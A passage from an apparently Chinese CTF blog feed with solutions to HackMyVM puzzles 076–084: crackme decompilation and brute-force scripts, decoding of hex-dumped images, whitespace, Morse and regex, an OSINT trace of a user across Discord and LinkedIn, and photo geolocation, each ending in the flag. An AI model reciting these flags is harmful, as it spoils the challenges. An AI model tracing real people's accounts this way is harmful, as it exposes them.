总计 1031
drwxr-xr-x 1 kali kali       0  8月 2日 22:07 .
drwxr-xr-x 1 kali kali    4096  8月 2日 22:07 ..
-rwxr-xr-x 1 kali kali   16224 2024年 9月26日 hmv-012
-rwxr-xr-x 1 kali kali 1034944 2024年 9月26日 hmv-012-static

┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/084]
└─$ ./hmv-012-static      
Enter the flag: xxoo
Incorrect flag.
```

反编译

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // eax
  int i; // [rsp+Ch] [rbp-74h]
  int v6; // [rsp+10h] [rbp-70h]
  int v7; // [rsp+14h] [rbp-6Ch]
  int v8; // [rsp+18h] [rbp-68h]
  int v9; // [rsp+1Ch] [rbp-64h]
  int v10; // [rsp+20h] [rbp-60h]
  int v11; // [rsp+24h] [rbp-5Ch]
  int v12; // [rsp+28h] [rbp-58h]
  int v13; // [rsp+2Ch] [rbp-54h]
  int v14; // [rsp+30h] [rbp-50h]
  int v15; // [rsp+34h] [rbp-4Ch]
  int v16; // [rsp+38h] [rbp-48h]
  int v17; // [rsp+3Ch] [rbp-44h]
  int v18; // [rsp+40h] [rbp-40h]
  int v19; // [rsp+44h] [rbp-3Ch]
  int v20; // [rsp+48h] [rbp-38h]
  char s1[24]; // [rsp+60h] [rbp-20h] BYREF
  unsigned __int64 v22; // [rsp+78h] [rbp-8h]

  v22 = __readfsqword(0x28u);
  printf('Enter the flag: ');
  __isoc99_scanf('%20s', s1);
  for ( i = 0; i &lt;= 19; ++i )
    *(&amp;v6 + i) = s1[i];
  if ( !strcmp(s1, 'HMV{StringsAgain?}') )
  {
    print_hint();
    return 0;
  }
  else
  {
    if ( v6 == 72
      &amp;&amp; (v4 = 8 * v7, LOBYTE(v4) = (8 * v7) ^ 0x90, (v4 | ((3 * (v7 ^ 0x13)) &gt;&gt; 3)) == 763)
      &amp;&amp; ((16 * v8) ^ 0x120 | ((2 * (v8 ^ 0x13)) &gt;&gt; 4)) == 1096
      &amp;&amp; ((32 * v9) ^ 0x240 | ((6 * (v9 ^ 0x13)) &gt;&gt; 5)) == 3379
      &amp;&amp; v10 == 90
      &amp;&amp; ((8 * (v11 ^ 0x12)) | ((3 * (v11 ^ 0x13)) &gt;&gt; 5)) == 267
      &amp;&amp; ((20 * (v12 ^ 0x34)) | ((2 * (v12 ^ 0x23)) &gt;&gt; 4)) == 2143
      &amp;&amp; v13 == 79
      &amp;&amp; ((56 * (v14 ^ 0x21)) | ((2 * (v14 ^ 0x33)) &gt;&gt; 2)) == 4648
      &amp;&amp; v15 == 95
      &amp;&amp; ((24 * (v16 ^ 0x11)) | ((3 * (v16 ^ 0x22)) &gt;&gt; 3)) == 1957
      &amp;&amp; ((24 * (v17 ^ 0x11)) | ((3 * (v17 ^ 0x23)) &gt;&gt; 3)) == 3068
      &amp;&amp; v18 == 103
      &amp;&amp; ((24 * (v19 ^ 0x11)) | ((3 * (v19 ^ 0x22)) &gt;&gt; 3)) == 2398
      &amp;&amp; ((24 * (v20 ^ 0x11)) | ((3 * (v20 ^ 0x22)) &gt;&gt; 3)) == 2595 )
    {
      puts('Congratulations! This is the correct flag.');
    }
    else
    {
      puts('Incorrect flag.');
    }
    return 0;
  }
}
```

进去print_hint函数看了眼，HMV{StringsAgain?}是假flag

写个py算一下

```python
def slv_v7():
    for i in range(32, 127):
        v7 = i
        v4_temp = 8 * v7
        v4 = (v4_temp &amp; 0xFFFFFF00) | ((v4_temp &amp; 0xFF) ^ 0x90)
        if (v4 | ((3 * (v7 ^ 0x13)) &gt;&gt; 3)) == 763:
            return chr(i)

def slv_v8():
    for i in range(32, 127):
        v8 = i
        if ((16 * v8) ^ 0x120 | ((2 * (v8 ^ 0x13)) &gt;&gt; 4)) == 1096:
            return chr(i)

def slv_v9():
    for i in range(32, 127):
        v9 = i
        if ((32 * v9) ^ 0x240 | ((6 * (v9 ^ 0x13)) &gt;&gt; 5)) == 3379:
            return chr(i)

def slv_v11():
    for i in range(32, 127):
        v11 = i
        if ((8 * (v11 ^ 0x12)) | ((3 * (v11 ^ 0x13)) &gt;&gt; 5)) == 267:
            return chr(i)

def slv_v12():
    for i in range(32, 127):
        v12 = i
        if ((20 * (v12 ^ 0x34)) | ((2 * (v12 ^ 0x23)) &gt;&gt; 4)) == 2143:
            return chr(i)

def slv_v14():
    for i in range(32, 127):
        v14 = i
        if ((56 * (v14 ^ 0x21)) | ((2 * (v14 ^ 0x33)) &gt;&gt; 2)) == 4648:
            return chr(i)

def slv_v16():
    for i in range(32, 127):
        v16 = i
        if ((24 * (v16 ^ 0x11)) | ((3 * (v16 ^ 0x22)) &gt;&gt; 3)) == 1957:
            return chr(i)

def slv_v17():
    for i in range(32, 127):
        v17 = i
        if ((24 * (v17 ^ 0x11)) | ((3 * (v17 ^ 0x23)) &gt;&gt; 3)) == 3068:
            return chr(i)

def slv_v19():
    for i in range(32, 127):
        v19 = i
        if ((24 * (v19 ^ 0x11)) | ((3 * (v19 ^ 0x22)) &gt;&gt; 3)) == 2398:
            return chr(i)

def slv_v20():
    for i in range(32, 127):
        v20 = i
        if ((24 * (v20 ^ 0x11)) | ((3 * (v20 ^ 0x22)) &gt;&gt; 3)) == 2595:
            return chr(i)

if __name__ == '__main__':
    flag = ['' for _ in range(15)]
    
    flag[0] = 'H'
    flag[1] = slv_v7()
    flag[2] = slv_v8()
    flag[3] = slv_v9()
    flag[4] = 'Z'
    flag[5] = slv_v11()
    flag[6] = slv_v12()
    flag[7] = 'O'
    flag[8] = slv_v14()
    flag[9] = '_'
    flag[10] = slv_v16()
    flag[11] = slv_v17()
    flag[12] = 'g'
    flag[13] = slv_v19()
    flag[14] = slv_v20()
    
    print(''.join(flag))
```

flag

```bash
HMV{Z0nl_bigt}
```



。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20084.html</guid><pubDate>Wed, 06 Aug 2025 00:39:35 +0000</pubDate></item><item><title>Challenge 083</title><link>https://7r1UMPHK.github.io/post/Challenge%20083.html</link><description>![image-20250803095854556](http://7r1UMPHK.github.io/image/20250803095903114.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 083.zip -o083

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 804934 bytes (787 KiB)

Extracting archive: 083.zip
--
Path = 083.zip
Type = zip
Physical Size = 804934

Everything is Ok

Size:       1516128
Compressed: 804934
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd 083
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/083]
└─$ ls -al                
总计 1485
drwxr-xr-x 1 kali kali       0  8月 2日 21:59 .
drwxr-xr-x 1 kali kali    4096  8月 2日 21:59 ..
-rwxr-xr-x 1 kali kali 1516128 2024年 8月26日 secret

┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/083]
└─$ head -n 10 secret 
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0271 0000 0190 0806 0000 00c1 7d36  ...q..........}6
00000020: 8200 0020 0049 4441 5478 5eec 9d07 9c5d  ... .IDATx^....]
00000030: 45d5 c067 b37d d37b af84 2484 2420 bd08  E..g.}.{..$.$ ..
00000040: 0888 0554 1450 143f ac88 8a15 6cd8 150b  ...T.P.?....l...
00000050: 62c3 aea8 8852 6c54 7b41 102c 8080 0212  b....RlT{A.,....
00000060: 0221 a186 12d2 7bd9 92fd ceff dc77 36b3  .!....{......w6.
00000070: 93b9 77ee ee4b 4854 1ebf b0bb efde 3b77  ..w..KHT......;w
00000080: ea99 ff9c 73e6 4ccd 9f7f 7c6e e7c6 8d1b  ....s.L...|n....
00000090: ddf0 e1c3 dd9d 77de e996 2e5f e6c6 8c19  ......w...._....
```

secret经过查看是xxd png的结果

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/083]
└─$ xxd -r secret &gt; secret.png
```

![secret](http://7r1UMPHK.github.io/image/20250803100524026.webp)

图片上有个base64

```bash
SE1We2FuY2llbnR0aW1lczE40DB9Cg==
```

去CyberChef解码

```bash
HMV{ancienttimes1880}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20083.html</guid><pubDate>Wed, 06 Aug 2025 00:39:21 +0000</pubDate></item><item><title>Challenge 082</title><link>https://7r1UMPHK.github.io/post/Challenge%20082.html</link><description>![image-20250803000325430](http://7r1UMPHK.github.io/image/20250803000325640.webp)

# 1. 初步分析与信息获取

首先，我们拿到了一个名为 `082.zip` 的压缩文件。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20082.html</guid><pubDate>Wed, 06 Aug 2025 00:39:02 +0000</pubDate></item><item><title>Challenge 081</title><link>https://7r1UMPHK.github.io/post/Challenge%20081.html</link><description>![image-20250729212955995](http://7r1UMPHK.github.io/image/20250729212956244.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 081.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1074 bytes (2 KiB)

Extracting archive: 081.zip
--
Path = 081.zip
Type = zip
Physical Size = 1074

Everything is Ok

Size:       918
Compressed: 1074
                    
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat -A message.txt 
 ^I   ^I  $
  ^I^I    $
 ^I  ^I^I^I $
 ^I ^I ^I  $
 ^I ^I^I^I^I^I$
 ^I ^I ^I^I^I$
  ^I^I    $
 ^I ^I  ^I $
 ^I ^I  ^I $
 ^I ^I^I  ^I$
 ^I ^I^I^I^I^I$
 ^I   ^I^I^I$
 ^I ^I ^I ^I$
 ^I ^I^I  ^I$
  ^I^I ^I ^I$
 ^I ^I^I^I^I^I$
$
$
$
^I   $
   ^I^I$
  ^I^I ^I$
^I   $
    ^I$
^I ^I $
^I ^I$
  ^I^I ^I$
   $
^I^I^I^I^I$
^I^I^I^I^I$
^I $
^I ^I ^I^I$
  ^I^I ^I$
$
$
$
   ^I   ^I^I^I$
^I$
      ^I^I    $
^I$
     ^I ^I ^I  $
^I$
     ^I ^I ^I  $
^I$
      ^I^I ^I  $
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I ^I ^I  $
^I$
      ^I^I ^I  $
^I$
     ^I  ^I ^I^I$
^I$
      ^I^I  ^I^I$
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I    ^I^I$
^I$
      ^I^I ^I  $
^I$
     ^I ^I  ^I $
^I$
      ^I^I  ^I^I$
^I$
     ^I ^I^I^I^I^I$
^I$
      ^I^I    $
^I$
     ^I   ^I^I $
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I ^I  ^I^I$
^I$
      ^I^I    $
^I$
     ^I  ^I^I ^I$
^I$
     ^I   ^I ^I$
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I    ^I $
^I$
     ^I ^I ^I ^I$
^I$
      ^I^I ^I ^I$
^I$
      ^I^I   ^I$
^I$
     ^I  ^I^I^I $
^I$
      ^I^I  ^I^I$
^I$
      ^I^I ^I ^I$
^I$
      ^I^I ^I ^I$
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I     ^I$
^I$
     ^I ^I  ^I $
^I$
      ^I^I    $
^I$
     ^I ^I ^I ^I$
^I$
     ^I  ^I^I^I $
^I$
     ^I   ^I  $
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I  ^I   $
^I$
      ^I^I  ^I^I$
^I$
     ^I ^I  ^I $
^I$
      ^I^I  ^I^I$
^I$
      ^I^I^I ^I $
^I$
      ^I ^I  ^I$
^I$
```

看着像之前那个空白加密Whitespace

结果不是.....

```bash
┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ hexdump -C message.txt
00000000  20 09 20 20 20 09 20 20  0a 20 20 09 09 20 20 20  | .   .  .  ..   |
00000010  20 0a 20 09 20 20 09 09  09 20 0a 20 09 20 09 20  | . .  ... . . . |
00000020  09 20 20 0a 20 09 20 09  09 09 09 09 0a 20 09 20  |.  . . ...... . |
00000030  09 20 09 09 09 0a 20 20  09 09 20 20 20 20 0a 20  |. ....  ..    . |
00000040  09 20 09 20 20 09 20 0a  20 09 20 09 20 20 09 20  |. .  . . . .  . |
00000050  0a 20 09 20 09 09 20 20  09 0a 20 09 20 09 09 09  |. . ..  .. . ...|
00000060  09 09 0a 20 09 20 20 20  09 09 09 0a 20 09 20 09  |... .   .... . .|
00000070  20 09 20 09 0a 20 09 20  09 09 20 20 09 0a 20 20  | . .. . ..  ..  |
00000080  09 09 20 09 20 09 0a 20  09 20 09 09 09 09 09 0a  |.. . .. . ......|
00000090  0a 0a 0a 09 20 20 20 0a  20 20 20 09 09 0a 20 20  |....   .   ...  |
000000a0  09 09 20 09 0a 09 20 20  20 0a 20 20 20 20 09 0a  |.. ...   .    ..|
000000b0  09 20 09 20 0a 09 20 09  0a 20 20 09 09 20 09 0a  |. . .. ..  .. ..|
000000c0  20 20 20 0a 09 09 09 09  09 0a 09 09 09 09 09 0a  |   .............|
000000d0  09 20 0a 09 20 09 20 09  09 0a 20 20 09 09 20 09  |. .. . ...  .. .|
000000e0  0a 0a 0a 0a 20 20 20 09  20 20 20 09 09 09 0a 09  |....   .   .....|
000000f0  0a 20 20 20 20 20 20 09  09 20 20 20 20 0a 09 0a  |.      ..    ...|
00000100  20 20 20 20 20 09 20 09  20 09 20 20 0a 09 0a 20  |     . . .  ... |
00000110  20 20 20 20 09 20 09 20  09 20 20 0a 09 0a 20 20  |    . . .  ...  |
00000120  20 20 20 20 09 09 20 09  20 20 0a 09 0a 20 20 20  |    .. .  ...   |
00000130  20 20 09 20 09 09 09 09  09 0a 09 0a 20 20 20 20  |  . ........    |
00000140  20 09 20 09 20 09 20 20  0a 09 0a 20 20 20 20 20  | . . .  ...     |
00000150  20 09 09 20 09 20 20 0a  09 0a 20 20 20 20 20 09  | .. .  ...     .|
00000160  20 20 09 20 09 09 0a 09  0a 20 20 20 20 20 20 09  |  . .....      .|
00000170  09 20 20 09 09 0a 09 0a  20 20 20 20 20 09 20 09  |.  .....     . .|
00000180  09 09 09 09 0a 09 0a 20  20 20 20 20 09 20 20 20  |.......     .   |
00000190  20 09 09 0a 09 0a 20 20  20 20 20 20 09 09 20 09  | .....      .. .|
000001a0  20 20 0a 09 0a 20 20 20  20 20 09 20 09 20 20 09  |  ...     . .  .|
000001b0  20 0a 09 0a 20 20 20 20  20 20 09 09 20 20 09 09  | ...      ..  ..|
000001c0  0a 09 0a 20 20 20 20 20  09 20 09 09 09 09 09 0a  |...     . ......|
000001d0  09 0a 20 20 20 20 20 20  09 09 20 20 20 20 0a 09  |..      ..    ..|
000001e0  0a 20 20 20 20 20 09 20  20 20 09 09 20 0a 09 0a  |.     .   .. ...|
000001f0  20 20 20 20 20 09 20 09  09 09 09 09 0a 09 0a 20  |     . ........ |
00000200  20 20 20 20 09 20 09 20  20 09 09 0a 09 0a 20 20  |    . .  .....  |
00000210  20 20 20 20 09 09 20 20  20 20 0a 09 0a 20 20 20  |    ..    ...   |
00000220  20 20 09 20 20 09 09 20  09 0a 09 0a 20 20 20 20  |  .  .. ....    |
00000230  20 09 20 20 20 09 20 09  0a 09 0a 20 20 20 20 20  | .   . ....     |
00000240  09 20 09 09 09 09 09 0a  09 0a 20 20 20 20 20 09  |. ........     .|
00000250  20 20 20 20 09 20 0a 09  0a 20 20 20 20 20 09 20  |    . ...     . |
00000260  09 20 09 20 09 0a 09 0a  20 20 20 20 20 20 09 09  |. . ....      ..|
00000270  20 09 20 09 0a 09 0a 20  20 20 20 20 20 09 09 20  | . ....      .. |
00000280  20 20 09 0a 09 0a 20 20  20 20 20 09 20 20 09 09  |  ....     .  ..|
00000290  09 20 0a 09 0a 20 20 20  20 20 20 09 09 20 20 09  |. ...      ..  .|
000002a0  09 0a 09 0a 20 20 20 20  20 20 09 09 20 09 20 09  |....      .. . .|
000002b0  0a 09 0a 20 20 20 20 20  20 09 09 20 09 20 09 0a  |...      .. . ..|
000002c0  09 0a 20 20 20 20 20 09  20 09 09 09 09 09 0a 09  |..     . .......|
000002d0  0a 20 20 20 20 20 09 20  20 20 20 20 09 0a 09 0a  |.     .     ....|
000002e0  20 20 20 20 20 09 20 09  20 20 09 20 0a 09 0a 20  |     . .  . ... |
000002f0  20 20 20 20 20 09 09 20  20 20 20 0a 09 0a 20 20  |     ..    ...  |
00000300  20 20 20 09 20 09 20 09  20 09 0a 09 0a 20 20 20  |   . . . ....   |
00000310  20 20 09 20 20 09 09 09  20 0a 09 0a 20 20 20 20  |  .  ... ...    |
00000320  20 09 20 20 20 09 20 20  0a 09 0a 20 20 20 20 20  | .   .  ...     |
00000330  09 20 09 09 09 09 09 0a  09 0a 20 20 20 20 20 09  |. ........     .|
00000340  20 20 09 20 20 20 0a 09  0a 20 20 20 20 20 20 09  |  .   ...      .|
00000350  09 20 20 09 09 0a 09 0a  20 20 20 20 20 09 20 09  |.  .....     . .|
00000360  20 20 09 20 0a 09 0a 20  20 20 20 20 20 09 09 20  |  . ...      .. |
00000370  20 09 09 0a 09 0a 20 20  20 20 20 20 09 09 09 20  | .....      ... |
00000380  09 20 0a 09 0a 20 20 20  20 20 20 09 20 09 20 20  |. ...      . .  |
00000390  09 0a 09 0a 20 20                                 |....  |
00000396
```

看着有点规律
```bash
┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat message.txt | tr ' \t' '01'  
01000100
00110000
01001110
01010100
01011111
01010111
00110000
01010010
01010010
01011001
01011111
01000111
01010101
01011001
00110101
01011111



1000
00011
001101
1000
00001
1010
101
001101
000
11111
11111
10
101011
001101



0001000111
1
000000110000
1
000001010100
1
000001010100
1
000000110100
1
000001011111
1
000001010100
1
000000110100
1
000001001011
1
000000110011
1
000001011111
1
000001000011
1
000000110100
1
000001010010
1
000000110011
1
000001011111
1
000000110000
1
000001000110
1
000001011111
1
000001010011
1
000000110000
1
000001001101
1
000001000101
1
000001011111
1
000001000010
1
000001010101
1
000000110101
1
000000110001
1
000001001110
1
000000110011
1
000000110101
1
000000110101
1
000001011111
1
000001000001
1
000001010010
1
000000110000
1
000001010101
1
000001001110
1
000001000100
1
000001011111
1
000001001000
1
000000110011
1
000001010010
1
000000110011
1
000000111010
1
000000101001
1
00
```

https://gchq.github.io/CyberChef/

![image-20250729214536810](http://7r1UMPHK.github.io/image/20250729214537116.webp)

第一段

```bash
D0NT_W0RRY_GUY5_
```

然后中间这段纯脑洞，是莫斯密码

```bash
┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat mosi|sed 's/1/-/g; s/0/./g'                                                                                                       
-...
...--
..--.-
-...
....-
-.-.
-.-
..--.-
...
-----
-----
-.
-.-.--
..--.-
```

https://morsecodetranslator.com/

```bash
B3_B4CK_S00N!_
```

后面的扒拉了半天，结果发现是转换的问题

```bash
┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ tail -n +35 message.txt | tr '$ \t' '001' | grep -v '^1$\|^$' | sed 's/^0000//' | sed 's/.*\(.\{8\}\)$/\1/'
01000111
00110000
01010100
01010100
00110100
01011111
01010100
00110100
01001011
00110011
01011111
01000011
00110100
01010010
00110011
01011111
00110000
01000110
01011111
01010011
00110000
01001101
01000101
01011111
01000010
01010101
00110101
00110001
01001110
00110011
00110101
00110101
01011111
01000001
01010010
00110000
01010101
01001110
01000100
01011111
01001000
00110011
01010010
00110011
00111010
00101001
00
```

![image-20250729222525237](http://7r1UMPHK.github.io/image/20250729222525532.webp)

```bash
G0TT4_T4K3_C4R3_0F_S0ME_BU51N355_AR0UND_H3R3:)
```

拼接

```bash
D0NT_W0RRY_GUY5_B3_B4CK_S00N!_G0TT4_T4K3_C4R3_0F_S0ME_BU51N355_AR0UND_H3R3:)
```

不用加HMV直接提交。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20081.html</guid><pubDate>Wed, 06 Aug 2025 00:38:41 +0000</pubDate></item><item><title>Challenge 080</title><link>https://7r1UMPHK.github.io/post/Challenge%20080.html</link><description>这两天配IE的X园区配的想鼠，github还没恢复，打个challenge冷静一下

![image-20250729212441389](http://7r1UMPHK.github.io/image/20250729212450348.webp)

```
(?![a-z])([VHM]{3})(?!\w)(?P&lt;Q&gt;[\{])R(?![\d])(e)g\3x(\_{1})4\4th\3\4(W)in(?P&lt;H&gt;\x7d)$
```

看着像正则

```
HMV{Regex_4_the_Win}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20080.html</guid><pubDate>Wed, 06 Aug 2025 00:37:57 +0000</pubDate></item><item><title>Challenge 079</title><link>https://7r1UMPHK.github.io/post/Challenge%20079.html</link><description>![image-20250728104622420](http://7r1UMPHK.github.io/image/20250728104641252.webp)

![image-20250728104649253](http://7r1UMPHK.github.io/image/20250728104649363.webp)

反编译

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  funkcja1(argc, argv, envp);
  return 0;
}

int funkcja1()
{
  char s[32]; // [rsp+0h] [rbp-40h] BYREF
  __int64 v2[2]; // [rsp+20h] [rbp-20h] BYREF
  int v3; // [rsp+30h] [rbp-10h]

  v2[0] = 0xC5E4E0C3F9E0D0D4LL;
  v2[1] = 0xE09AD8F7E4C0E1D3LL;
  v3 = -1802251312;
  policz_to(s, v2, string72);
  return puts(s);
}

__int64 __fastcall policz_to(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  int i; // [rsp+24h] [rbp-4h]

  for ( i = 0; i &lt;= 19; ++i )
    *(_BYTE *)(i + a1) = ~(*(_BYTE *)(i + a3) ^ *(_BYTE *)(i + a2));
  result = a1 + 20;
  *(_BYTE *)(a1 + 20) = 0;
  return result;
}

.data:0000000000407910 string72        db 'dIZQmPVTUttkFJ0SlZ81',0
.data:0000000000407910                                         ; DATA XREF: funkcja1+37↑o
```

他这个程序直接执行是会输出东西的

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ./hmv-011       
OfEWQOMnyjKpNmULCvTZ
```

但问题是这个不是flag，而且我根据他的tip，尝试rev也不行

然后我去仔细观察了一下ida，我发现他还有很多funkcja的函数，1-100

```c
int funkcja2()
{
  char s[32]; // [rsp+0h] [rbp-40h] BYREF
  __int64 v2[2]; // [rsp+20h] [rbp-20h] BYREF
  int v3; // [rsp+30h] [rbp-10h]

  v2[0] = 0xD9CD87CFF6E48DECLL;
  v2[1] = 0xEFC3BFD3FFEE83FELL;
  v3 = -1044847680;
  policz_to(s, v2, string9);
  return puts(s);
}
```

那直接写个脚本爆破

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ objdump -d ./hmv-011 | grep -A 10 '&lt;main&gt;:'
0000000000403336 &lt;main&gt;:
  403336:       f3 0f 1e fa             endbr64
  40333a:       55                      push   %rbp
  40333b:       48 89 e5                mov    %rsp,%rbp
  40333e:       b8 00 00 00 00          mov    $0x0,%eax
  403343:       e8 56 de ff ff          call   40119e &lt;funkcja1&gt;
  403348:       b8 00 00 00 00          mov    $0x0,%eax
  40334d:       5d                      pop    %rbp
  40334e:       c3                      ret

Disassembly of section .fini:
```

编写脚本

```bash
#!/bin/bash

BIN='./hmv-011'
ADDR='*0x403343'

for i in $(seq 1 100); do
    FN='funkcja${i}'
    echo -n '[*] test: ${FN}'

    OUT=$(gdb -q -batch \
        -ex 'b ${ADDR}' \
        -ex 'r' \
        -ex 'jump ${FN}' \
        -ex 'c' \
        --args ${BIN} 2&gt;/dev/null)

    if echo '$OUT' | grep -q 'HMV{'; then
        echo -e '\n\n[+] Found: ${FN}'
        echo '[!] FLAG: $(echo '$OUT' | grep -o 'HMV{[^}]*}')'
        exit 0
    else
        echo -ne '\r'
    fi
done

echo '[-] Failed.'
```

执行

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ bash a.sh
[*] test: funkcja82

[+] Found: funkcja82
[!] FLAG: HMV{Is11task_hard??}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20079.html</guid><pubDate>Wed, 06 Aug 2025 00:37:40 +0000</pubDate></item><item><title>Challenge 078</title><link>https://7r1UMPHK.github.io/post/Challenge%20078.html</link><description>这题我说怎么这么眼熟，这不我进群解的第一题吗
![image-20250727223622608](http://7r1UMPHK.github.io/image/20250727223622837.webp)

是有一个用户叫Alter

https://hackmyvm.eu/profile/?user=Alter

![img](https://hackmyvm.eu/img/u/Alter.jpg)

他头像有问题，是discord的一个用户

https://discord.id/

![](http://7r1UMPHK.github.io/image/20250806083618411.webp)

去hmv的discord扒拉一下他
![image-20250727224618346](http://7r1UMPHK.github.io/image/20250727224618491.webp)

然后这个哥们在linkedin，有个号

https://www.linkedin.com/in/alter-ego-003280321/

```
HMV{4lt3r_3g0s_d0nt_h1d3}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20078.html</guid><pubDate>Wed, 06 Aug 2025 00:36:42 +0000</pubDate></item><item><title>Challenge 077</title><link>https://7r1UMPHK.github.io/post/Challenge%20077.html</link><description>![image-20250727172730845](http://7r1UMPHK.github.io/image/20250727172731096.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 077.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 4255250 bytes (4156 KiB)

Extracting archive: 077.zip
--
Path = 077.zip
Type = zip
Physical Size = 4255250

Everything is Ok

Size:       4283925
Compressed: 4255250
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 8360
drwxr-xr-x 1 kali kali    4096  7月27日 05:28 .
drwxr-xr-x 1 kali kali   16384  7月26日 10:07 ..
-rwxr-xr-x 1 kali kali 4255250  7月27日 05:27 077.zip
-rwxr-xr-x 1 kali kali 4283925 2024年 7月 5日 Building.jpg

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ exiftool Building.jpg 
ExifTool Version Number         : 13.25
File Name                       : Building.jpg
Directory                       : .
File Size                       : 4.3 MB
File Modification Date/Time     : 2024:07:05 15:37:28-04:00
File Access Date/Time           : 2025:07:27 05:28:10-04:00
File Inode Change Date/Time     : 2024:07:05 15:37:28-04:00
File Permissions                : -rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Orientation                     : Horizontal (normal)
Y Resolution                    : 72
X Resolution                    : 72
Software                        : MediaTek Camera Application
Image Description               : 
Y Cb Cr Positioning             : Co-sited
Exif Version                    : 0220
Exposure Compensation           : 0
Exposure Program                : Not Defined
Color Space                     : sRGB
Max Aperture Value              : 1.0
Exif Image Height               : 4096
Brightness Value                : 9.6
Flashpix Version                : 0100
Interoperability Index          : R98 - DCF basic file (sRGB)
Recommended Exposure Index      : 0
Exposure Mode                   : Auto
Exif Image Width                : 3072
Components Configuration        : Y, Cb, Cr, -
Digital Zoom Ratio              : 1
Metering Mode                   : Center-weighted average
Sensitivity Type                : Unknown
Scene Capture Type              : Standard
Light Source                    : Other
Resolution Unit                 : inches
Compression                     : JPEG (old-style)
Thumbnail Offset                : 616
Thumbnail Length                : 27648
Image Width                     : 3072
Image Height                    : 4096
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 3072x4096
Megapixels                      : 12.6
Thumbnail Image                 : (Binary data 27648 bytes, use -b option to extract)
```

​	EXIF数据没有包含街道名称的字段

![Building](http://7r1UMPHK.github.io/image/20250727173525425.webp)

google一下

https://jp.123rf.com/photo_24186080_%E3%83%95%E3%83%A9%E3%83%B3%E3%82%B9-%E3%83%91%E3%83%AA%E3%81%AE%E5%85%B8%E5%9E%8B%E7%9A%84%E3%81%AA%E3%82%A2%E3%83%91%E3%83%BC%E3%83%88%E3%81%AE%E5%BB%BA%E7%89%A9.html

https://www.flickr.com/photos/62139793@N03/5653696549/in/photostream/

蒙马特 圣心大教堂

扒拉了很久，找不到，去discord发现绿老哥解过了

https://www.google.pl/maps/@48.887831,2.341695,3a,20.4y,17.44h,85.63t/data=!3m7!1e1!3m5!1sf_2fd7iAG1y1DnDGNPVqkQ!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D4.371506987724828%26panoid%3Df_2fd7iAG1y1DnDGNPVqkQ%26yaw%3D17.439427502100934!7i16384!8i8192?coh=205410&amp;entry=ttu

抄一下

````
HMV{Rue_Saint-Vincent}
````

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20077.html</guid><pubDate>Wed, 06 Aug 2025 00:34:42 +0000</pubDate></item><item><title>Challenge 076</title><link>https://7r1UMPHK.github.io/post/Challenge%20076.html</link><description>![image-20250727171057275](http://7r1UMPHK.github.io/image/20250727171101631.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd tmp      
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
